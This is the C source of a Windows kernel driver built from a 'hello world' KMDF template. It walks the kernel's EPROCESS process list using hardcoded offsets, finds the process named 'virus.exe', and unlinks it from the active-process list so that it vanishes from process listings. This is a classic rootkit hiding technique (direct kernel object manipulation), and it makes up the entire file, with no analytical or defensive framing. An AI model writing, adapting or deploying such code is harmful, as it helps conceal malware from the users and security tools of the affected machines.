#include <ntddk.h>
#include <wdf.h>
#include <minwindef.h>
#include <memory.h>
#include <wdm.h>

#define EPROC_PID_OFFSET 0x00000000000002e8
#define EPROC_IMGNAME_OFFSET 0x0000000000000450

#define EPROC_LINKS_OFFSET 0x00000000000002f0
#define EPROC_FLINK_OFFSET 0x00000000000002f0
#define EPROC_BLINK_OFFSET 0x00000000000002f8

#define MAX_CHAR_LEN 65535
#define MAX_PROCESS 512
#define MAX_IMG_NAME_SIZE 15

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD KmdfHelloWorldEvtDeviceAdd;

DWORD* get_eproc_pid(BYTE* pEprocPtr);
UCHAR* get_eproc_img(BYTE* pEprocPtr);
BYTE* get_eproc_flink(BYTE* pEprocPtr);
BYTE* get_next_eproc(BYTE* pCurrentEproc);
void print_info_eproc(BYTE* pEproc);
void print_all_processes();
BYTE* find_eproc_ptr(UCHAR* pImgName);
void print_hex(const char *s, size_t vSize);
void hide_process(BYTE* pEproc);

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	WDF_DRIVER_CONFIG config;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "KmdfHelloWorld: DriverEntry\n"));
	WDF_DRIVER_CONFIG_INIT(&config, KmdfHelloWorldEvtDeviceAdd);
	status = WdfDriverCreate(DriverObject, RegistryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, WDF_NO_HANDLE);
	return status;
}

NTSTATUS KmdfHelloWorldEvtDeviceAdd(_In_ WDFDRIVER Driver, _Inout_ PWDFDEVICE_INIT DeviceInit)
{
	UNREFERENCED_PARAMETER(Driver);
	NTSTATUS status;
	WDFDEVICE hDevice;

	BYTE *vMyEproc;
	BYTE *vSearchEproc = NULL;
	UCHAR vProcName[] = "virus.exe";
	vMyEproc = (BYTE*) PsGetCurrentProcess();

	vSearchEproc=find_eproc_ptr(vProcName);
	if (vSearchEproc != NULL)
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "MyDriver: PROCESS FOUND.\n"));
		print_info_eproc(vSearchEproc);
		hide_process(vSearchEproc);
	}
	else
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "MyDriver: PROCESS NOT FOUND.\n"));

	status = WdfDeviceCreate(&DeviceInit, WDF_NO_OBJECT_ATTRIBUTES, &hDevice);
	return status;
}

/*
* INPUT : pointer to EPROCESS memory location
* OUTPUT : pointer to INPUT's imgname field
*/
DWORD* get_eproc_pid(BYTE* pEprocPtr)
{
	return (DWORD*)(pEprocPtr + EPROC_PID_OFFSET);
}

/*
* INPUT : pointer to EPROCESS memory location
* OUTPUT : pointer to INPUT's imgname field
*/
UCHAR* get_eproc_img(BYTE* pEprocPtr)
{
	return (UCHAR*)(pEprocPtr + EPROC_IMGNAME_OFFSET);
}

/*
* INPUT : pointer to EPROCESS memory location
* OUTPUT : pointer to INPUT's ForwardLink field
*/
BYTE* get_eproc_flink(BYTE* pEprocPtr)
{
	return (BYTE*)(pEprocPtr + EPROC_FLINK_OFFSET);
}

/*
* INPUT : pointer to EPROCESS memory location
* OUTPUT : pointer to its next EPROCESS, pointed by its FLink
*/
BYTE* get_next_eproc(BYTE* pCurrentEproc)
{
	LIST_ENTRY activeLinks;
	activeLinks =*((LIST_ENTRY*)(pCurrentEproc + EPROC_LINKS_OFFSET));

	return ((BYTE*)(activeLinks.Flink) - EPROC_FLINK_OFFSET);
}

/*
* INPUT : pointer to EPROCESS memory location
* OUTPUT : pointer to its next EPROCESS, pointed by its BLink
*/
BYTE* get_previous_eproc(BYTE* pCurrentEproc)
{
	LIST_ENTRY activeLinks;
	activeLinks = *((LIST_ENTRY*)(pCurrentEproc + EPROC_LINKS_OFFSET));

	return ((BYTE*)(activeLinks.Blink) - EPROC_BLINK_OFFSET);
}

/*
* INPUT : None
* OUTPUT : None, simply print as Kernel Debug msg all processes found in kernel memory
*/
void print_all_processes()
{
	BYTE* vEproc = (BYTE*)PsGetCurrentProcess();
	DWORD vStartPid = 0;
	DWORD vCurrentPid = 0;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "MyDriver: Starting listing of all processes...\n"));

	vStartPid = *get_eproc_pid(vEproc);
	print_info_eproc(vEproc);

	while (vCurrentPid != vStartPid)
	{
		vEproc = get_next_eproc(vEproc);
		vCurrentPid = *get_eproc_pid(vEproc);
		print_info_eproc(vEproc);
	}
}

/*
* INPUT : Pointer to a EPROCESS base address
* OUTPUT : None, print process Image name, base address and PID as kernel debug messages
*/
void print_info_eproc(BYTE* pEproc)
{
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "MyDriver: EPROCESS Image Name %s\n", get_eproc_img(pEproc)));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "MyDriver: EPROCESS base address : %p\n", pEproc));
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "MyDriver: EPROCESS PID : %u\n", *get_eproc_pid(pEproc)));
}

/*
* INPUT : Pointer to a UCHAR array
* OUTPUT : BYTE* pointer to the process whose imgname equals the input or NULL
*/
BYTE* find_eproc_ptr(UCHAR* pImgName)
{
	BYTE* vEproc = (BYTE*)PsGetCurrentProcess();
	DWORD vStartPid = 0;
	DWORD vCurrentPid = 0;
	UCHAR* vCurrentImg = NULL;
	size_t vCmpSize = strlen((const char*)pImgName);
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "MyDriver: Trying to find %s...\n",pImgName));

	vStartPid = *get_eproc_pid(vEproc);

	while (vCurrentPid != vStartPid)
	{
		vEproc = get_next_eproc(vEproc);
		vCurrentPid = *get_eproc_pid(vEproc);
		vCurrentImg = get_eproc_img(vEproc);
		if (memcmp(vCurrentImg,pImgName, vCmpSize) == 0)
			return vEproc;
	}
	return NULL;
}
/*
* Debug fn
*/
void print_hex(const char *s, size_t vSize)
{
	int i = 0;
	for (i = 0; i < vSize; i++)
	{
		KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "%02x", s[i]));
	}
	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "\n"));
}

void hide_process(BYTE* pEproc)
{
	LIST_ENTRY *vCurrentLinks, *vNextLinks, *vPreviousLinks;

	KdPrintEx((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, "Hiding process...\n"));

	vCurrentLinks = ((LIST_ENTRY*)(pEproc + EPROC_LINKS_OFFSET));
	vNextLinks = (*vCurrentLinks).Flink;
	vPreviousLinks = (*vCurrentLinks).Blink;

	(*vNextLinks).Blink = vPreviousLinks;
	(*vPreviousLinks).Flink = vNextLinks;
	(*vCurrentLinks).Flink = vCurrentLinks;
	(*vCurrentLinks).Blink = vCurrentLinks;

	return;
}
